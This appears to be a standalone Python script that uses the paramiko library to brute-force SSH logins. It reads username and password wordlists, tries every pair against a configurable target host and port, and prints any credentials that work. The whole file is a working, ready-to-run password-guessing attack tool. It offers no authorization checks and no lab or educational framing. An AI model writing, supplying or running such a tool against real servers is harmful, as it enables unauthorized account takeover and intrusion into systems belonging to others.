import paramiko
import sys
import os

def brute_force_ssh(hostname, port, username_list_path, password_list_path):
    """
    Performs a brute-force attack on SSH.

    Args:
        hostname (str): Target IP or hostname.
        port (int): Target SSH port (default 22).
        username_list_path (str): Path to the username wordlist file.
        password_list_path (str): Path to the password wordlist file.
    """
    print(f"[*] Starting SSH brute force on: {hostname}:{port}")
    
    usernames = []
    passwords = []

    try:
        with open(username_list_path, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(password_list_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: Ensure '{username_list_path}' and '{password_list_path}' files exist.")
        sys.exit(1)

    if not usernames or not passwords:
        print("[-] Error: Username or password wordlist is empty. Please check your files.")
        sys.exit(1)

    found = False
    attempt_count = 0

    # Disable overly verbose SSH logging from paramiko
    paramiko.util.log_to_file(os.devnull)

    for username in usernames:
        for password in passwords:
            attempt_count += 1
            client = paramiko.SSHClient()
            # This will automatically add host keys.
            # In production scenarios, you should be more strict with host key verification.
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
            try:
                print(f"[*] Attempt {attempt_count}: {username}:{password}")
                client.connect(hostname, port=port, username=username, password=password, timeout=3)
                print(f"\n[+] Credentials found after {attempt_count} attempts!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                found = True
                break # Stop if found
            except paramiko.AuthenticationException:
                # Authentication failed, continue to the next combination
                pass 
            except paramiko.SSHException as e:
                # A more serious SSH error occurred (e.g., connection lost)
                print(f"[-] SSH error: {e}. Stopping attempts for this combination.")
                # Continue to the next username, as there might be a host key issue or similar
                break 
            except Exception as e:
                # Catch any other unexpected errors
                print(f"[-] Unexpected error: {e}. Stopping attempts for this combination.")
                break
            finally:
                client.close()
        if found:
            break

    if not found:
        print(f"\n[-] No matching credentials found after {attempt_count} attempts.")

if __name__ == "__main__":
    # --- CONFIGURE THESE VALUES ---
    # Target SSH IP or hostname.
    TARGET_HOST = "127.0.0.1" 
    
    # Target SSH port, usually 22.
    TARGET_PORT = 22          

    # Paths to the username and password wordlist files.
    USERNAME_WORDLIST = "ssh_usernames.txt"
    PASSWORD_WORDLIST = "ssh_passwords.txt"
    # ----------------------------

    brute_force_ssh(
        TARGET_HOST,
        TARGET_PORT,
        USERNAME_WORDLIST,
        PASSWORD_WORDLIST
    )
